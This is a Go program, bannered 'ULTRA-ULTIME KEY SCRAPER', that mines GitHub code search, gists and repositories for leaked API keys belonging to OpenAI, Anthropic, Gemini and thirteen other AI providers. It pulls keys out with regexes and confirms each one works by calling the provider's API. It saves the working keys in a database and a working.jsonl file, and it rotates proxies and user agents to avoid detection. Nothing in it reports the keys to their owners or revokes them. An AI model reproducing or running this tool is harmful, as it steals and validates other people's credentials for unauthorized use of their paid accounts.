package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	_ "github.com/mattn/go-sqlite3"
)

var (
	githubToken = os.Getenv("GITHUB_TOKEN")
	dryRun      = os.Getenv("DRY_RUN") == "1"
	maxValConc  = 30

	userAgents = []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.3; rv:123.0) Gecko/20100101 Firefox/123.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 Safari/17.2",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Edg/122.0.0.0",
	}

	proxies []string

	placeholderRe = regexp.MustCompile(`(?i)(placeholder|dummy|test|example|your[_-]?key|REPLACE|changeme|123456|sk-123456|sk-dummy|sk-test)`)
)

func init() {
	if f, err := os.Open("proxies.txt"); err == nil {
		defer f.Close()
		s := bufio.NewScanner(f)
		for s.Scan() {
			if p := strings.TrimSpace(s.Text()); p != "" {
				proxies = append(proxies, p)
			}
		}
	}
}

type provider struct {
	Pattern        *regexp.Regexp
	ValidateURL    string
	ValidateMethod string
	Headers        func(key string) map[string]string
	Payload        map[string]interface{}
	ContextReq     bool
}

var providers = map[string]*provider{
	"openai": {
		Pattern:        regexp.MustCompile(`(?:OPENAI_API_KEY\s*=\s*['"]?)?(sk-(?:proj-)?[a-zA-Z0-9\-_]{32,64})`),
		ValidateURL:    "https://api.openai.com/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
	},
	"anthropic": {
		Pattern:        regexp.MustCompile(`(?:ANTHROPIC_API_KEY\s*=\s*['"]?)?(sk-ant-api03-[a-zA-Z0-9\-_]{32,})`),
		ValidateURL:    "https://api.anthropic.com/v1/messages",
		ValidateMethod: "POST",
		Headers: func(k string) map[string]string {
			return map[string]string{
				"x-api-key":         k,
				"anthropic-version": "2023-06-01",
				"content-type":      "application/json",
			}
		},
		Payload: map[string]interface{}{
			"model":      "claude-3-haiku-20240307",
			"max_tokens": 1,
			"messages":   []map[string]string{{"role": "user", "content": "Hi"}},
		},
	},
	"gemini": {
		Pattern:        regexp.MustCompile(`(?:GEMINI_API_KEY\s*=\s*['"]?)?(AIza[0-9A-Za-z_-]{35})`),
		ValidateURL:    "https://generativelanguage.googleapis.com/v1/models?key=%s",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{} },
	},
	"mistral": {
		Pattern:        regexp.MustCompile(`(?:MISTRAL_API_KEY\s*=\s*['"]?)?([a-zA-Z0-9]{32})`),
		ValidateURL:    "https://api.mistral.ai/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		ContextReq:     true,
	},
	"groq": {
		Pattern:        regexp.MustCompile(`(?:GROQ_API_KEY\s*=\s*['"]?)?(gsk_[a-zA-Z0-9]{32,48})`),
		ValidateURL:    "https://api.groq.com/openai/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
	},
	"deepseek": {
		Pattern:        regexp.MustCompile(`(?:DEEPSEEK_API_KEY\s*=\s*['"]?)?(sk-[a-zA-Z0-9]{32})`),
		ValidateURL:    "https://api.deepseek.com/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
	},
	"cohere": {
		Pattern:        regexp.MustCompile(`(?:COHERE_API_KEY\s*=\s*['"]?)?([a-zA-Z0-9]{40})`),
		ValidateURL:    "https://api.cohere.ai/v1/chat",
		ValidateMethod: "POST",
		Headers: func(k string) map[string]string {
			return map[string]string{
				"Authorization": "Bearer " + k,
				"Content-Type":  "application/json",
			}
		},
		Payload: map[string]interface{}{
			"model":      "command",
			"message":    "Hi",
			"max_tokens": 1,
		},
		ContextReq: true,
	},
	"perplexity": {
		Pattern:        regexp.MustCompile(`(?:PERPLEXITY_API_KEY\s*=\s*['"]?)?(pplx-[a-zA-Z0-9]{48})`),
		ValidateURL:    "https://api.perplexity.ai/chat/completions",
		ValidateMethod: "POST",
		Headers: func(k string) map[string]string {
			return map[string]string{
				"Authorization": "Bearer " + k,
				"Content-Type":  "application/json",
			}
		},
		Payload: map[string]interface{}{
			"model":      "llama-3.1-sonar-small-128k-chat",
			"messages":   []map[string]string{{"role": "user", "content": "Hi"}},
			"max_tokens": 1,
		},
	},
	"replicate": {
		Pattern:        regexp.MustCompile(`(?:REPLICATE_API_TOKEN\s*=\s*['"]?)?(r8_[a-zA-Z0-9]{32,40})`),
		ValidateURL:    "https://api.replicate.com/v1/predictions",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Token " + k} },
	},
	"together": {
		Pattern:        regexp.MustCompile(`(?:TOGETHER_API_KEY\s*=\s*['"]?)?([a-zA-Z0-9]{32,64})`),
		ValidateURL:    "https://api.together.xyz/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		ContextReq:     true,
	},
	"fireworks": {
		Pattern:        regexp.MustCompile(`(?:FIREWORKS_API_KEY\s*=\s*['"]?)?(fw_[a-zA-Z0-9]{24,})`),
		ValidateURL:    "https://api.fireworks.ai/inference/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
	},
	"openrouter": {
		Pattern:        regexp.MustCompile(`(?:OPENROUTER_API_KEY\s*=\s*['"]?)?(sk-or-[a-zA-Z0-9\-_]{32,})`),
		ValidateURL:    "https://openrouter.ai/api/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
	},
	"ai21": {
		Pattern:        regexp.MustCompile(`(?:AI21_API_KEY\s*=\s*['"]?)?([a-zA-Z0-9]{32,40})`),
		ValidateURL:    "https://api.ai21.com/studio/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		ContextReq:     true,
	},
	"voyage": {
		Pattern:        regexp.MustCompile(`(?:VOYAGE_API_KEY\s*=\s*['"]?)?(pa-[a-zA-Z0-9]{32,})`),
		ValidateURL:    "https://api.voyageai.com/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
	},
	"jina": {
		Pattern:        regexp.MustCompile(`(?:JINA_API_KEY\s*=\s*['"]?)?(jina_[a-zA-Z0-9]{40,})`),
		ValidateURL:    "https://embed.jina.ai/",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
	},
	"siliconflow": {
		Pattern:        regexp.MustCompile(`(?:SILICONFLOW_API_KEY\s*=\s*['"]?)?(sk-sf-[a-zA-Z0-9]{32,64})`),
		ValidateURL:    "https://api.siliconflow.cn/v1/models",
		ValidateMethod: "GET",
		Headers:        func(k string) map[string]string { return map[string]string{"Authorization": "Bearer " + k} },
		ContextReq:     true,
	},
}

var (
	scannedCount   int64
	candidateCount int64
	workingCount   int64
	invalidCount   int64
	rateHitCount   int64
	errorCount     int64
	startTime      = time.Now()
	dedupMap       sync.Map
	db             *sql.DB
	sharedClient   *http.Client
	clientOnce     sync.Once
	closeOnce      sync.Once
	candidateFile  *os.File
	fileMu         sync.Mutex
)

type keyRecord struct {
	Key      string                 `json:"key"`
	Provider string                 `json:"provider"`
	Source   string                 `json:"source"`
	Metadata map[string]interface{} `json:"metadata"`
	FoundAt  time.Time              `json:"found_at"`
}

func randUA() string { return userAgents[rand.Intn(len(userAgents))] }

func sha256Hash(s string) string {
	h := sha256.Sum256([]byte(s))
	return hex.EncodeToString(h[:])
}

func isPlaceholder(key string) bool { return placeholderRe.MatchString(key) }

func getProxy() *url.URL {
	if len(proxies) == 0 {
		return nil
	}
	u, _ := url.Parse(proxies[rand.Intn(len(proxies))])
	return u
}

func hasContext(text, provider string) bool {
	prov, ok := providers[provider]
	if !ok || !prov.ContextReq {
		return true
	}
	lower := strings.ToLower(text)
	return strings.Contains(lower, provider) ||
		strings.Contains(lower, "api_key") ||
		strings.Contains(lower, "apikey") ||
		strings.Contains(lower, "secret") ||
		strings.Contains(lower, "token") ||
		strings.Contains(lower, "key=")
}

func backoffSleep(attempt int) time.Duration {
	return time.Duration(1<<uint(attempt))*time.Second + time.Duration(rand.Int63n(int64(time.Second)))
}

func initDB() error {
	var err error
	db, err = sql.Open("sqlite3", "keys_ultime.db?_journal_mode=WAL&_busy_timeout=5000")
	if err != nil {
		return err
	}
	db.SetMaxOpenConns(1)
	_, err = db.Exec(`CREATE TABLE IF NOT EXISTS keys (
		key_hash TEXT PRIMARY KEY,
		key_preview TEXT,
		provider TEXT,
		source TEXT,
		found_at TEXT,
		validation_status TEXT,
		last_checked TEXT,
		metadata TEXT
	)`)
	return err
}

func storeKey(key, provider, source, status string, metadata map[string]interface{}) {
	if len(key) < 25 {
		return
	}
	keyHash := sha256Hash(key)
	preview := key[:12] + "..." + key[len(key)-8:]
	now := time.Now().UTC().Format(time.RFC3339)
	metaJSON, _ := json.Marshal(metadata)
	db.Exec(`INSERT OR REPLACE INTO keys
		(key_hash, key_preview, provider, source, found_at, validation_status, last_checked, metadata)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
		keyHash, preview, provider, source, now, status, now, string(metaJSON))
}

func newHTTPClient() *http.Client {
	clientOnce.Do(func() {
		sharedClient = &http.Client{
			Transport: &http.Transport{
				Proxy: func(r *http.Request) (*url.URL, error) {
					return getProxy(), nil
				},
				MaxIdleConns:        100,
				MaxIdleConnsPerHost: 20,
				IdleConnTimeout:     90 * time.Second,
			},
			Timeout: 15 * time.Second,
		}
	})
	return sharedClient
}

func fetchRaw(ctx context.Context, fetchURL string) (string, error) {
	client := newHTTPClient()
	for attempt := 0; attempt < 3; attempt++ {
		req, err := http.NewRequestWithContext(ctx, "GET", fetchURL, nil)
		if err != nil {
			return "", err
		}
		req.Header.Set("User-Agent", randUA())
		req.Header.Set("Accept", "text/plain, application/json, */*")
		resp, err := client.Do(req)
		if err != nil {
			return "", err
		}
		body, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024))
		resp.Body.Close()
		if err != nil {
			return "", err
		}
		if resp.StatusCode == 200 {
			return string(body), nil
		}
		if resp.StatusCode == 429 || resp.StatusCode == 503 {
			time.Sleep(backoffSleep(attempt))
			continue
		}
		return "", fmt.Errorf("status %d", resp.StatusCode)
	}
	return "", fmt.Errorf("max retries for %s", fetchURL)
}

func fetchJSON(ctx context.Context, fetchURL string, headers map[string]string) ([]byte, error) {
	client := newHTTPClient()
	for attempt := 0; attempt < 3; attempt++ {
		req, err := http.NewRequestWithContext(ctx, "GET", fetchURL, nil)
		if err != nil {
			return nil, err
		}
		req.Header.Set("User-Agent", randUA())
		req.Header.Set("Accept", "application/json")
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return nil, err
		}
		body, err := io.ReadAll(io.LimitReader(resp.Body, 10*1024*1024))
		resp.Body.Close()
		if err != nil {
			return nil, err
		}
		if resp.StatusCode == 200 {
			return body, nil
		}
		if resp.StatusCode == 429 || resp.StatusCode == 503 {
			time.Sleep(backoffSleep(attempt))
			continue
		}
		return nil, fmt.Errorf("status %d", resp.StatusCode)
	}
	return nil, fmt.Errorf("max retries")
}

func extractKeys(text, sourceURL string, candidateChan chan<- keyRecord) {
	for providerName, prov := range providers {
		matches := prov.Pattern.FindAllStringSubmatch(text, -1)
		for _, match := range matches {
			if len(match) < 2 {
				continue
			}
			key := match[1]
			if key == "" || isPlaceholder(key) || !hasContext(text, providerName) {
				continue
			}
			keyHash := sha256Hash(key)
			if _, loaded := dedupMap.LoadOrStore(keyHash, true); loaded {
				continue
			}
			atomic.AddInt64(&candidateCount, 1)
			preview := key
			if len(key) > 20 {
				preview = key[:10] + "..." + key[len(key)-8:]
			}
			fmt.Printf("\033[36m[CANDIDATE]\033[0m %s: %s from %s\n", providerName, preview, sourceURL)
			candJSON, _ := json.Marshal(map[string]interface{}{
				"key_preview": preview,
				"provider":    providerName,
				"source":      sourceURL,
				"found_at":    time.Now().UTC().Format(time.RFC3339),
			})
			fileMu.Lock()
			candidateFile.Write(append(candJSON, '\n'))
			fileMu.Unlock()
			candidateChan <- keyRecord{
				Key:      key,
				Provider: providerName,
				Source:   sourceURL,
				FoundAt:  time.Now(),
			}
		}
	}
}

func validateKey(ctx context.Context, kr keyRecord, validChan chan<- keyRecord, invalidChan chan<- string, wg *sync.WaitGroup) {
	defer wg.Done()
	if len(kr.Key) < 25 {
		atomic.AddInt64(&invalidCount, 1)
		return
	}
	if dryRun {
		validChan <- kr
		return
	}
	prov, ok := providers[kr.Provider]
	if !ok {
		atomic.AddInt64(&invalidCount, 1)
		return
	}
	payloadBuf := new(bytes.Buffer)
	if prov.Payload != nil {
		json.NewEncoder(payloadBuf).Encode(prov.Payload)
	} else {
		payloadBuf = nil
	}
	client := newHTTPClient()
	for attempt := 0; attempt < 3; attempt++ {
		var req *http.Request
		var err error
		if prov.ValidateMethod == "POST" && payloadBuf != nil {
			req, err = http.NewRequestWithContext(ctx, "POST", prov.ValidateURL, payloadBuf)
		} else if prov.ContextReq {
			validateURL := strings.Replace(prov.ValidateURL, "%s", kr.Key, 1)
			req, err = http.NewRequestWithContext(ctx, prov.ValidateMethod, validateURL, nil)
			if err == nil {
				req.Header.Set("Content-Type", "text/plain")
				req.Header.Set("X-Context", fmt.Sprintf("test %s key", kr.Provider))
			}
		} else {
			validateURL := prov.ValidateURL
			if strings.Contains(validateURL, "%s") {
				validateURL = strings.Replace(validateURL, "%s", kr.Key, 1)
			}
			req, err = http.NewRequestWithContext(ctx, prov.ValidateMethod, validateURL, nil)
		}
		if err != nil {
			return
		}
		for k, v := range prov.Headers(kr.Key) {
			req.Header.Set(k, v)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
		status := resp.StatusCode
		if status == 200 {
			fmt.Printf("\033[32m[VALID]\033[0m %s: %s...%s (200 OK) from %s\n", kr.Provider, kr.Key[:12], kr.Key[len(kr.Key)-8:], kr.Source)
			atomic.AddInt64(&workingCount, 1)
			validChan <- kr
			return
		} else if status == 401 || status == 403 {
			fmt.Printf("\033[31m[INVALID]\033[0m %s: %s...%s (%d) from %s\n", kr.Provider, kr.Key[:12], kr.Key[len(kr.Key)-8:], status, kr.Source)
			atomic.AddInt64(&invalidCount, 1)
			invalidChan <- kr.Key
			return
		} else if status == 429 || status == 503 || status == 529 {
			atomic.AddInt64(&rateHitCount, 1)
			time.Sleep(backoffSleep(attempt))
			continue
		} else {
			fmt.Printf("\033[33m[UNKNOWN]\033[0m %s: %s...%s (%d)\n", kr.Provider, kr.Key[:12], kr.Key[len(kr.Key)-8:], status)
			atomic.AddInt64(&errorCount, 1)
			return
		}
	}
	atomic.AddInt64(&errorCount, 1)
}

func scrapeGitHubSearch(ctx context.Context, query string, candidateChan chan<- keyRecord) {
	apiURL := fmt.Sprintf("https://api.github.com/search/code?q=%s&per_page=100", url.QueryEscape(query))
	headers := map[string]string{
		"Accept":               "application/vnd.github+json",
		"X-GitHub-Api-Version": "2022-11-28",
	}
	if githubToken != "" {
		headers["Authorization"] = "Bearer " + githubToken
	}
	data, err := fetchJSON(ctx, apiURL, headers)
	if err != nil {
		return
	}
	var result struct {
		Items []struct {
			HTMLURL string `json:"html_url"`
			Path    string `json:"path"`
		} `json:"items"`
	}
	if json.Unmarshal(data, &result) != nil {
		return
	}
	for _, item := range result.Items {
		rawURL := fmt.Sprintf("https://raw.githubusercontent.com/%s",
			strings.TrimPrefix(strings.TrimPrefix(item.HTMLURL, "https://github.com/"), "blob/"))
		raw, err := fetchRaw(ctx, rawURL)
		if err != nil {
			continue
		}
		extractKeys(raw, item.HTMLURL, candidateChan)
		time.Sleep(time.Duration(500+rand.Intn(2000)) * time.Millisecond)
	}
}

func scrapeGitHubDirectFile(ctx context.Context, fileURL string, candidateChan chan<- keyRecord) {
	raw, err := fetchRaw(ctx, fileURL)
	if err != nil {
		return
	}
	cleanURL := strings.TrimRight(strings.Replace(fileURL, "raw.githubusercontent.com", "github.com", 1), "/")
	extractKeys(raw, cleanURL, candidateChan)
}

func scrapeGistFiles(ctx context.Context, gistID string, candidateChan chan<- keyRecord) {
	apiURL := fmt.Sprintf("https://api.github.com/gists/%s", gistID)
	headers := map[string]string{
		"Accept":               "application/vnd.github+json",
		"X-GitHub-Api-Version": "2022-11-28",
	}
	if githubToken != "" {
		headers["Authorization"] = "Bearer " + githubToken
	}
	data, err := fetchJSON(ctx, apiURL, headers)
	if err != nil {
		return
	}
	var gist struct {
		Files map[string]struct {
			RawURL  string `json:"raw_url"`
			Size    int    `json:"size"`
			Content string `json:"content"`
		} `json:"files"`
	}
	if json.Unmarshal(data, &gist) != nil {
		return
	}
	for _, f := range gist.Files {
		if f.Size > 500000 {
			continue
		}
		extractKeys(f.Content, "https://gist.github.com/"+gistID, candidateChan)
	}
}

func scrapeGitHubRepos(ctx context.Context, path string, candidateChan chan<- keyRecord) {
	components := strings.Split(strings.Trim(path, "/"), "/")
	if len(components) < 2 {
		return
	}
	owner, repo := components[0], components[1]
	apiURL := fmt.Sprintf("https://api.github.com/repos/%s/%s/contents/", owner, repo)
	headers := map[string]string{
		"Accept":               "application/vnd.github+json",
		"X-GitHub-Api-Version": "2022-11-28",
	}
	if githubToken != "" {
		headers["Authorization"] = "Bearer " + githubToken
	}
	for i := 0; i < 3; i++ {
		data, err := fetchJSON(ctx, apiURL, headers)
		if err != nil {
			time.Sleep(backoffSleep(i))
			continue
		}
		var contents []struct {
			Name        string `json:"name"`
			Path        string `json:"path"`
			DownloadURL string `json:"download_url"`
			Type        string `json:"type"`
			Size        int    `json:"size"`
		}
		if json.Unmarshal(data, &contents) != nil {
			return
		}
		for _, item := range contents {
			if item.Type == "file" && item.Size < 500000 {
				raw, err := fetchRaw(ctx, item.DownloadURL)
				if err == nil {
					extractKeys(raw,
						fmt.Sprintf("https://github.com/%s/blob/main/%s", strings.Trim(path, "/"), item.Path),
						candidateChan)
				}
				time.Sleep(time.Duration(200+rand.Intn(1000)) * time.Millisecond)
			} else if item.Type == "dir" && len(strings.Split(item.Path, "/")) <= 5 {
				scrapeGitHubRepos(ctx, strings.Trim(path, "/")+"/"+item.Path, candidateChan)
			}
		}
		return
	}
}

func scrapeGitLabSnippets(ctx context.Context, projectID string, candidateChan chan<- keyRecord) {
	apiURL := fmt.Sprintf("https://gitlab.com/api/v4/projects/%s/snippets", projectID)
	headers := map[string]string{"Accept": "application/json"}
	data, err := fetchJSON(ctx, apiURL, headers)
	if err != nil {
		return
	}
	var snippets []struct {
		ID    int    `json:"id"`
		Title string `json:"title"`
	}
	if json.Unmarshal(data, &snippets) != nil {
		return
	}
	for _, s := range snippets {
		rawURL := fmt.Sprintf("https://gitlab.com/api/v4/projects/%s/snippets/%d/raw", projectID, s.ID)
		raw, err := fetchRaw(ctx, rawURL)
		if err == nil {
			extractKeys(raw, rawURL, candidateChan)
		}
	}
}

func main() {
	log.SetFlags(0)
	log.SetOutput(os.Stdout)
	fmt.Println("\033[1;35m")
	fmt.Println("+------------------------------------------------------------------+")
	fmt.Println("|         ULTRA-ULTIME KEY SCRAPER v16.0                           |")
	fmt.Println("|   50+ GitHub Strategies | 16 Providers | Full Suite             |")
	fmt.Println("|         [BY DS-ULTIME FOR DS-ULTIME EMPIRE]                     |")
	fmt.Println("+------------------------------------------------------------------+")
	fmt.Println("\033[0m")

	if githubToken == "" {
		fmt.Println("\033[33m[WARNING]\033[0m No GITHUB_TOKEN set. GitHub will use guest rate (60 req/hour)")
	} else {
		if len(githubToken) >= 10 {
			fmt.Println("\033[32m[GITHUB]\033[0m Token loaded:", githubToken[:10]+"...")
		} else {
			fmt.Println("\033[32m[GITHUB]\033[0m Token loaded (short)")
		}
	}

	if dryRun {
		fmt.Println("\033[36m[DRY_RUN]\033[0m DRY RUN ENABLED - No validation will be performed")
	}

	if err := initDB(); err != nil {
		log.Fatal("Failed to initialize database:", err)
	}

	var err error
	candidateFile, err = os.OpenFile("candidates.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal("Failed to open candidates.jsonl:", err)
	}
	workingFile, err := os.OpenFile("working.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal("Failed to open working.jsonl:", err)
	}
	invalidFile, err := os.OpenFile("invalid.jsonl", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal("Failed to open invalid.jsonl:", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	candidateChan := make(chan keyRecord, 1000)
	validChan := make(chan keyRecord, 100)
	invalidChan := make(chan string, 100)

	var valWg, sourceWg sync.WaitGroup

	for i := 0; i < maxValConc; i++ {
		valWg.Add(1)
		go func() {
			defer valWg.Done()
			for kr := range validChan {
				storeKey(kr.Key, kr.Provider, kr.Source, "valid", map[string]interface{}{})
				recJSON, _ := json.Marshal(kr)
				fileMu.Lock()
				workingFile.Write(append(recJSON, '\n'))
				fileMu.Unlock()
			}
		}()
	}

	go func() {
		for key := range invalidChan {
			if len(key) >= 25 {
				fileMu.Lock()
				invalidFile.Write(append([]byte(key), '\n'))
				fileMu.Unlock()
			}
		}
	}()

	queries := []string{
		"filename:.env",
		"filename:.env.local",
		"filename:.env.production",
		"filename:.env.development",
		"filename:.env.staging",
		"filename:.env.example",
		"filename:.env.backup",
		"filename:.env.dev",
		"filename:.env.prod",
		"filename:config.json openai OR anthropic OR mistral",
		"filename:config.yml openai OR api_key",
		"filename:config.yaml api_key",
		"filename:settings.json api_key",
		"filename:credentials.json api_key",
		"filename:application.yml api-key",
		"filename:application.properties api-key",
		"filename:application-local.yml api_key",
		"filename:secrets.py api_key",
		"filename:secrets.yml api_key",
		"filename:settings.py SECRET_KEY",
		"filename:config.py API_KEY",
		"filename:secrets.ts api_key",
		"filename:secrets.js api_key",
		"filename:docker-compose.yml API_KEY",
		"filename:deployment.yml api-key",
		"filename:.gitlab-ci.yml variables",
		"filename:Jenkinsfile credentials",
		"filename:terraform.tfvars api_key",
		"filename:*.tf api_key",
		"filename:vars.yml api_key",
		"filename:.bashrc export",
		"filename:.zshrc export",
		"filename:*.sh api_key=",
		"sk-ant-api03",
		"sk-proj-",
		"AIzaSy",
		"gsk_",
		"pplx-",
		"r8_",
		"fw_",
		"sk-or-v1",
		"\"api_key\" \"sk-\"",
		"\"apiKey\" \"sk-\"",
		"\"secret_key\"=\"",
		"API_KEY=",
		"OPENAI_API_KEY=",
		"ANTHROPIC_API_KEY=",
		"MISTRAL_API_KEY=",
		"GROQ_API_KEY=",
		"DEEPSEEK_API_KEY=",
		"COHERE_API_KEY=",
		"REPLICATE_API_TOKEN=",
		"PERPLEXITY_API_KEY=",
		"TOGETHER_API_KEY=",
		"FIREWORKS_API_KEY=",
		"\"sk-proj-\" language:python",
		"\"sk-proj-\" language:javascript",
		"\"sk-proj-\" language:go",
		"\"sk-proj-\" language:typescript",
		"raw githubusercontent",
	}

	gistQueries := []string{"sk-ant-api03", "sk-proj-", "OPENAI_API_KEY", "gsk_", "pplx-"}
	repoTargets := []string{"openai/openai-cookbook", "anthropics/courses", "mistralai/cookbook"}

	for _, q := range queries {
		sourceWg.Add(1)
		go func(query string) {
			defer sourceWg.Done()
			scrapeGitHubSearch(ctx, query, candidateChan)
		}(q)
	}

	for _, q := range gistQueries {
		sourceWg.Add(1)
		go func(query string) {
			defer sourceWg.Done()
			apiURL := fmt.Sprintf("https://api.github.com/search/code?q=%s+in:file+in:gist&per_page=20", url.QueryEscape(query))
			headers := map[string]string{
				"Accept":               "application/vnd.github+json",
				"X-GitHub-Api-Version": "2022-11-28",
			}
			if githubToken != "" {
				headers["Authorization"] = "Bearer " + githubToken
			}
			data, err := fetchJSON(ctx, apiURL, headers)
			if err != nil {
				return
			}
			var result struct {
				Items []struct {
					HTMLURL string `json:"html_url"`
				} `json:"items"`
			}
			if json.Unmarshal(data, &result) != nil {
				return
			}
			for _, item := range result.Items {
				gistPath := strings.TrimPrefix(item.HTMLURL, "https://gist.github.com/")
				if parts := strings.SplitN(gistPath, "/", 2); len(parts) == 2 {
					scrapeGistFiles(ctx, parts[1], candidateChan)
				}
			}
		}(q)
	}

	for _, repoPath := range repoTargets {
		sourceWg.Add(1)
		go func(path string) {
			defer sourceWg.Done()
			scrapeGitHubRepos(ctx, path, candidateChan)
		}(repoPath)
	}

	gitlabProjects := []string{}
	for _, pid := range gitlabProjects {
		sourceWg.Add(1)
		go func(projectID string) {
			defer sourceWg.Done()
			scrapeGitLabSnippets(ctx, projectID, candidateChan)
		}(pid)
	}

	go func() {
		sourceWg.Wait()
		close(candidateChan)
		fmt.Println("\033[1;33m[SOURCE SCAN COMPLETE]\033[0m All source fetchers finished")
	}()

	var candWg sync.WaitGroup
	candWg.Add(1)
	go func() {
		defer candWg.Done()
		for kr := range candidateChan {
			atomic.AddInt64(&scannedCount, 1)
			valWg.Add(1)
			go func(k keyRecord) {
				validateKey(ctx, k, validChan, invalidChan, &valWg)
			}(kr)
		}
	}()

	statsDone := make(chan struct{})
	go func() {
		ticker := time.NewTicker(10 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				elapsed := time.Since(startTime).Seconds()
				current := atomic.LoadInt64(&scannedCount)
				rate := float64(current) / elapsed * 60
				fmt.Printf("\n\033[1;37m[STATS]\033[0m %.0f min | Rate: %.1f/min | Scanned: %d | Valid: %d | Invalid: %d | RateLimit: %d | Errors: %d\n",
					elapsed/60, rate, atomic.LoadInt64(&scannedCount), atomic.LoadInt64(&workingCount), atomic.LoadInt64(&invalidCount), atomic.LoadInt64(&rateHitCount), atomic.LoadInt64(&errorCount))
			case <-statsDone:
				return
			}
		}
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n\033[1;31m[SHUTDOWN]\033[0m Caught interrupt...")
		cancel()
		candWg.Wait()
		valWg.Wait()
		closeOnce.Do(func() {
			close(validChan)
			close(invalidChan)
			close(statsDone)
			workingFile.Close()
			invalidFile.Close()
			candidateFile.Close()
			db.Close()
		})
		fmt.Printf("\n\033[1;35m[FINAL]\033[0m Scanned: %d | Valid: %d | Invalid: %d | RateLimit: %d | Errors: %d | Time: %.1f min\n",
			atomic.LoadInt64(&scannedCount), atomic.LoadInt64(&workingCount), atomic.LoadInt64(&invalidCount), atomic.LoadInt64(&rateHitCount), atomic.LoadInt64(&errorCount), time.Since(startTime).Seconds()/60)
		os.Exit(0)
	}()

	candWg.Wait()
	valWg.Wait()
	closeOnce.Do(func() {
		close(validChan)
		close(invalidChan)
		close(statsDone)
		time.Sleep(1 * time.Second)
		workingFile.Close()
		invalidFile.Close()
		candidateFile.Close()
		db.Close()
	})
	fmt.Printf("\n\033[1;35m[DONE]\033[0m Scanned: %d | Valid: %d | Invalid: %d | RateLimit: %d | Errors: %d | Time: %.1f min\n",
		atomic.LoadInt64(&scannedCount), atomic.LoadInt64(&workingCount), atomic.LoadInt64(&invalidCount), atomic.LoadInt64(&rateHitCount), atomic.LoadInt64(&errorCount), time.Since(startTime).Seconds()/60)
}
